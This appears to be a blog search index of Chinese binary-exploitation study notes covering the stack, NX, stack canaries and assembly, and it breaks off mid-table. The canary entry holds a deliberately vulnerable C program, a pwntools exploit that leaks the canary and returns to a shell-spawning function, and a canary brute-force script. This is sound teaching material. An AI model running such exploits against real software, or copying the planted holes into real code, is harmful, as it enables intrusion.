<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2025/07/a143ee4cfc9e.html"/>
      <url>/2025/07/a143ee4cfc9e.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> RELRO </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/a2b39843e48c.html"/>
      <url>/2025/07/a2b39843e48c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> ASLR和PIE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/7ed5c8bb5686.html"/>
      <url>/2025/07/7ed5c8bb5686.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> ASLR和PIE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈介绍</title>
      <link href="/2025/07/d7b458a5691a.html"/>
      <url>/2025/07/d7b458a5691a.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈介绍</title>
      <link href="/2025/07/a1ac756bd223.html"/>
      <url>/2025/07/a1ac756bd223.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h1><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/../../../../../../images/image-20250701104727634.png" alt="image-20250701104727634"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong><code>程序的栈是从进程地址空间的高地址向低地址增长的</code></strong>。</p><h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="栈指针-SP"><a href="#栈指针-SP" class="headerlink" title="栈指针 (SP)"></a>栈指针 (SP)</h3><ul><li>x86: ESP (32位), x64: RSP (64位)</li><li>始终指向栈顶位置</li><li><code>push/pop</code> 指令自动修改 SP</li></ul><h3 id="基址指针-BP"><a href="#基址指针-BP" class="headerlink" title="基址指针 (BP)"></a>基址指针 (BP)</h3><ul><li>x86: EBP, x64: RBP</li><li>作为当前栈帧的基准点</li><li>用于定位参数和局部变量</li></ul><h3 id="指令指针-IP"><a href="#指令指针-IP" class="headerlink" title="指令指针 (IP)"></a>指令指针 (IP)</h3><ul><li>x86: EIP, x64: RIP</li><li>存储下一条执行指令地址</li><li><code>call/ret</code> 指令修改 IP</li></ul><h2 id="函数调用过程（关键！）"><a href="#函数调用过程（关键！）" class="headerlink" title="函数调用过程（关键！）"></a>函数调用过程（关键！）</h2><h3 id="调用者-Caller-准备"><a href="#调用者-Caller-准备" class="headerlink" title="调用者 (Caller) 准备"></a>调用者 (Caller) 准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 参数压栈（从右向左）</span><br><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">; 2. 调用函数</span><br><span class="line">call function  ; 自动压入返回地址(EIP/RIP)</span><br></pre></td></tr></table></figure><h3 id="被调函数-Callee-序言"><a href="#被调函数-Callee-序言" class="headerlink" title="被调函数 (Callee) 序言"></a>被调函数 (Callee) 序言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function:</span><br><span class="line">; 1. 保存调用者栈帧</span><br><span class="line">push ebp        ; 保存旧EBP</span><br><span class="line">; 2. 建立新栈帧</span><br><span class="line">mov ebp, esp    ; EBP = 当前ESP</span><br><span class="line">; 3. 分配局部变量空间</span><br><span class="line">sub esp, 0x20   ; 分配32字节空间</span><br></pre></td></tr></table></figure><h3 id="栈帧内存布局（32位示例）"><a href="#栈帧内存布局（32位示例）" class="headerlink" title="栈帧内存布局（32位示例）"></a>栈帧内存布局（32位示例）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数3        | [ebp + 16]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数2        | [ebp + 12]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数1        | [ebp + 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|    返回地址      | [ebp + 4]  ← 漏洞利用关键点！</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的EBP       | &lt;-- EBP (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量1     | [ebp - 4]</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量2     | [ebp - 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|     ...         | </span><br><span class="line">+-----------------+</span><br><span class="line">|    临时空间      | &lt;-- ESP (栈顶)</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="函数返回过程"><a href="#函数返回过程" class="headerlink" title="函数返回过程"></a>函数返回过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 返回值存入EAX（约定）</span><br><span class="line">mov eax, return_value</span><br><span class="line">; 2. 释放局部空间</span><br><span class="line">mov esp, ebp    ; ESP = EBP</span><br><span class="line">; 3. 恢复调用者栈帧</span><br><span class="line">pop ebp         ; 恢复旧EBP</span><br><span class="line">; 4. 返回到调用者</span><br><span class="line">ret             ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p>寄存器的图</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/figure/register.png" alt="img"></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><ul><li>x86<ul><li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 栈溢出与ROP </category>
          
          <category> Stack Overflow </category>
          
          <category> x86x64 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NX</title>
      <link href="/2025/06/7061e081f5fe.html"/>
      <url>/2025/06/7061e081f5fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。</p><p>​NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 VirtualProtect 或 VirtualAlloc,Linux上使用mprotect或者 mmap，这些 API 允许更改已分配页面的保护级别。</p><p>​在 Linux 中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段(.data、.bss等)以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode 的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击(ret2libc)。</p><p>​如下所示，Ubuntu 中已经默认启用了NX。GNUSTACK段在禁用NX时权限为RWE，而开启<br>后权限仅为 RW，不可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc zexecstack hello,c &amp;&amp; readelf -l a.out | grep-A1 GNU STACK # 禁用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> No-eXecute </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Canary</title>
      <link href="/2025/06/3a2170f3b1a8.html"/>
      <url>/2025/06/3a2170f3b1a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> Linux安全机制 </category>
          
          <category> Stack Canaries </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CPU架构与进程的执行</title>
      <link href="/2025/06/a3f22c1b9650.html"/>
      <url>/2025/06/a3f22c1b9650.html</url>
      
        <content type="html"><![CDATA[<h1 id="CPU-与指令集基础概念"><a href="#CPU-与指令集基础概念" class="headerlink" title="CPU 与指令集基础概念"></a>CPU 与指令集基础概念</h1><h2 id="CPU-的核心组件"><a href="#CPU-的核心组件" class="headerlink" title="CPU 的核心组件"></a>CPU 的核心组件</h2><ul><li>算术逻辑单元（ALU）：执行算术和逻辑运算（如加法、比较）。</li><li>控制单元（CU）：解析指令并协调 CPU 各组件工作。</li><li>寄存器（Registers）：CPU 内部的高速存储单元，用于暂存数据和指令。</li><li>总线（Bus）：连接 CPU 与内存、IO 设备的数据通道。</li></ul><h2 id="指令集（Instruction-Set-Architecture-ISA）"><a href="#指令集（Instruction-Set-Architecture-ISA）" class="headerlink" title="指令集（Instruction Set Architecture, ISA）"></a>指令集（Instruction Set Architecture, ISA）</h2><ul><li><p>定义：CPU 支持的指令集合，规定了 CPU 能执行的基本操作。</p></li><li><p>分类：</p><ul><li>复杂指令集（CISC）：如 x86，指令长度可变，支持复杂操作（如内存直接操作）。</li><li>精简指令集（RISC）：如 ARM，指令长度固定，强调简单指令的高效执行。</li><li>超长指令字（VLIW）：如 TI DSP，并行执行多条指令。</li></ul></li></ul><h2 id="汇编语言与指令集的关系"><a href="#汇编语言与指令集的关系" class="headerlink" title="汇编语言与指令集的关系"></a>汇编语言与指令集的关系</h2><ul><li>汇编指令是机器指令的助记符，与指令集一一对应。</li><li>不同 CPU 架构（如 x86、ARM）的汇编语言差异显著，不可通用。</li></ul><p><img src="/../../../../../images/image-20250629233840943.png" alt="image-20250629233840943"></p><h1 id="进程的执行"><a href="#进程的执行" class="headerlink" title="进程的执行"></a>进程的执行</h1><p><img src="/../../../../../images/image-20250629234753250.png" alt="image-20250629234753250"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> glb;     <span class="comment">//未赋值的全局整型变量对应Bss</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t = x + y; <span class="comment">//局部变量对应Stack</span></span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">void</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//局部变量对应Stack</span></span><br><span class="line">    read(<span class="number">0</span>, ptr, <span class="number">0x100</span>); <span class="comment">// input &quot;deadbeef&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../../../../../images/image-20250630130607400.png" alt="image-20250630130607400"></p><p><img src="/../../../../../images/image-20250630135559594.png" alt="image-20250630135559594"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 汇编基础 </category>
          
          <category> CPU架构与指令集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>装载与汇编</title>
      <link href="/2025/06/fc710085a15b.html"/>
      <url>/2025/06/fc710085a15b.html</url>
      
        <content type="html"><![CDATA[<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><p><img src="/../../../../../images/image-20250630141153683.png" alt="image-20250630141153683"></p><p><img src="/../../../../../images/image-20250630140857482.png" alt="image-20250630140857482"></p><p><img src="/../../../../../images/image-20250630141427878.png" alt="image-20250630141427878"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="两种语法风格"><a href="#两种语法风格" class="headerlink" title="两种语法风格"></a>两种语法风格</h2><table><thead><tr><th>功能 &#x2F; 场景</th><th>Intel 汇编格式</th><th>AT&amp;T 汇编格式</th></tr></thead><tbody><tr><td><strong>立即数传送到寄存器</strong></td><td><code>mov eax, 8</code></td><td><code>movl $8, %eax</code></td></tr><tr><td><strong>带十六进制立即数的传送</strong></td><td><code>mov ebx, 0ffffh</code></td><td><code>movl $0xffff, %ebx</code></td></tr><tr><td><strong>触发系统调用（中断）</strong></td><td><code>int 